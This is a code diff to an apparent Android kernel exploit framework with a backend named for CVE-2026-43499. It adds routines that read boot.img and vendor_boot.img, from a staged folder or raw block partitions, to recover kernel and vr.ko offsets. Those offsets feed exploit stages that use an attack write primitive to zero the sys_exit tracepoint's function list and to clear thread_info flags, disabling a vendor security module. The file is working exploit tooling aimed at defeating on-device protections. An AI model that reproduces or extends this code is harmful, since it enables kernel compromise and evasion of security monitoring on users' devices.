@@ -12,6 +12,8 @@
 #include "session/backend/cve_2026_43499_backend.hpp"
 
 #include "attack/ops.hpp"
+#include "bootimg/extract.h"
+#include "bootimg/physmap.h"
 #include "common.h"
 #include "kernel/target.h"
 #include "kernelsnitch/utils.h"
@@ -30,9 +32,12 @@
 
 #include <array>
 #include <cstdint>
+#include <cstdlib>
 #include <optional>
+#include <string>
 #include <string_view>
 #include <utility>
+#include <vector>
 
 namespace ghostlock::session::backend {
     namespace {
@@ -145,6 +150,102 @@ namespace ghostlock::session::backend {
             return vr_needed;
         }
 
+        /* The boot images the runtime fallbacks read, in priority order: the
+         * app stages its picks under GHOSTLOCK_HOME (= its files dir), and the
+         * raw partitions serve a root shell running the standalone binary.
+         * Unreadable entries are skipped, so the fallback simply stays off in
+         * an environment without either. */
+        std::vector<std::string> staged_image_candidates(const char *file_name) {
+            std::vector<std::string> paths;
+            if (const char *home = std::getenv("GHOSTLOCK_HOME")) {
+                paths.emplace_back(std::string(home) + "/" + file_name);
+            }
+            paths.emplace_back(std::string("/dev/block/by-name/") + file_name + "_a");
+            paths.emplace_back(std::string("/dev/block/by-name/") + file_name);
+            return paths;
+        }
+
+        /* Runtime W1c anchor (cached): the profile's offset.sys_exit_tp_funcs
+         * wins; otherwise the embedded kallsyms + BTF of a staged boot.img
+         * supplies the same image offset. Cached per process so a chain retry
+         * never re-parses the image. */
+        uint64_t sys_exit_tp_funcs_image_cached() {
+            static const uint64_t cached = []() -> uint64_t {
+                if (ghostlock::profile::sys_exit_tp_funcs_present()) {
+                    return ghostlock::profile::sys_exit_tp_funcs_image();
+                }
+                for (const std::string &path : staged_image_candidates("boot.img")) {
+                    auto data = ghostlock::bootimg::load_boot_image(path.c_str());
+                    if (!data.has_value()) {
+                        continue;
+                    }
+                    auto offset = ghostlock::bootimg::recover_sys_exit_tp_funcs_image(
+                        std::span<const std::uint8_t>(*data));
+                    if (offset.has_value()) {
+                        pr_success("W1c: sys_exit_tp_funcs=0x%llx recovered from %s "
+                                   "(kallsyms+BTF)\n",
+                                   static_cast<unsigned long long>(*offset),
+                                   path.c_str());
+                        return *offset;
+                    }
+                    pr_warning("W1c: boot image %s parsed but no sys_exit funcs "
+                               "(%s)\n",
+                               path.c_str(),
+                               ghostlock::bootimg::error_name(offset.error()));
+                }
+                return 0;
+            }();
+            return cached;
+        }
+
+        /* Runtime W2b tag offsets (cached): profile values win, then the
+         * vr.ko module inside a staged vendor_boot.img. Returns 0s when
+         * neither source knows, and the caller keeps its family defaults. */
+        struct VrTagOffsets {
+            uint32_t tag_a;
+            uint32_t tag_b;
+            bool probed;
+        };
+        VrTagOffsets vr_tag_offsets_cached() {
+            static const VrTagOffsets cached = []() -> VrTagOffsets {
+                const uint32_t profile_a = ghostlock::profile::vr_tag_a_off();
+                const uint32_t profile_b = ghostlock::profile::vr_tag_b_off();
+                if (profile_a != 0 && profile_b != 0) {
+                    return VrTagOffsets{profile_a, profile_b, false};
+                }
+                for (const std::string &path : staged_image_candidates("vendor_boot.img")) {
+                    auto data = ghostlock::bootimg::load_boot_image(path.c_str());
+                    if (!data.has_value()) {
+                        continue;
+                    }
+                    const ghostlock::bootimg::VrKoProbeResult probe =
+                        ghostlock::bootimg::probe_vrko_from_vendor_boot(
+                            std::span<const std::uint8_t>(*data));
+                    if (!probe.valid) {
+                        pr_warning("VR: vendor_boot %s present but no vr.ko tags: %s\n",
+                                   path.c_str(), probe.error_msg.c_str());
+                        continue;
+                    }
+                    pr_success("VR: vr.ko tags recovered from %s: tag_a=0x%llx tag_b=0x%llx (%s)\n",
+                               path.c_str(),
+                               static_cast<unsigned long long>(probe.tag_a_offset),
+                               static_cast<unsigned long long>(probe.tag_b_offset),
+                               probe.module_path.c_str());
+                    /* The profile value (when set) still wins per field: the
+                     * extractor derived it from the same image at parse time
+                     * and the user may have overridden it by hand. */
+                    return VrTagOffsets{
+                        profile_a != 0 ? profile_a
+                                       : static_cast<uint32_t>(probe.tag_a_offset),
+                        profile_b != 0 ? profile_b
+                                       : static_cast<uint32_t>(probe.tag_b_offset),
+                        true};
+                }
+                return VrTagOffsets{profile_a, profile_b, false};
+            }();
+            return cached;
+        }
+
         /* Stage W1c: globally disarm vr.ko's sys_exit tracepoint probe (Neo11
          * root.c "Option B", adapted to this write primitive). Zeroing
          * __tracepoint_sys_exit->funcs returns the tracepoint to its
@@ -163,14 +264,15 @@ namespace ghostlock::session::backend {
             if (!vr_module_loaded()) {
                 return;
             }
-            if (!ghostlock::profile::sys_exit_tp_funcs_present()) {
-                pr_warning("W1c: profile lacks offset.sys_exit_tp_funcs; "
+            const uint64_t image_offset = sys_exit_tp_funcs_image_cached();
+            if (image_offset == 0) {
+                pr_warning("W1c: no offset.sys_exit_tp_funcs (profile, staged "
+                           "boot.img and boot partition all failed); "
                            "vr global disarm skipped (per-task tag clear only)\n");
                 return;
             }
             const memory::WriteRequest request = memory::WriteRequest::make(
-                session.addresses.data_alias(
-                    ghostlock::profile::sys_exit_tp_funcs_image()),
+                session.addresses.data_alias(image_offset),
                 memory::WriteMode::Zero, 1);
             if (Cve2026_43499Policy::template attack_write<M>(
                     session, request, "W1c: vr sys_exit")) {
@@ -238,13 +340,13 @@ namespace ghostlock::session::backend {
 
                 int32_t vr_ok = 1;
                 if (vr_needed) {
-                    /* Profile-provided tag offsets (vendor_boot vr.ko probe,
-                     * extractor off_vr_tag_a/b) override the compile-time
-                     * family constants; 0 keeps the measured defaults. */
-                    const uint32_t tag_a = ghostlock::profile::vr_tag_a_off();
-                    const uint32_t tag_b = ghostlock::profile::vr_tag_b_off() != 0
-                                                   ? ghostlock::profile::vr_tag_b_off()
-                                                   : VR_TAG_B_OFF;
+                    /* Resolution order per field: profile (extractor probe at
+                     * parse time, or a hand override) > the vr.ko module inside
+                     * a staged vendor_boot.img (probed here, cached) > the
+                     * measured family constants. */
+                    const VrTagOffsets tags = vr_tag_offsets_cached();
+                    const uint32_t tag_a = tags.tag_a;
+                    const uint32_t tag_b = tags.tag_b != 0 ? tags.tag_b : VR_TAG_B_OFF;
 
                     /* 1) Clear thread_info.flags word (covers tag A when it
                      * lives inside the first 8 bytes + the tracepoint bit). */
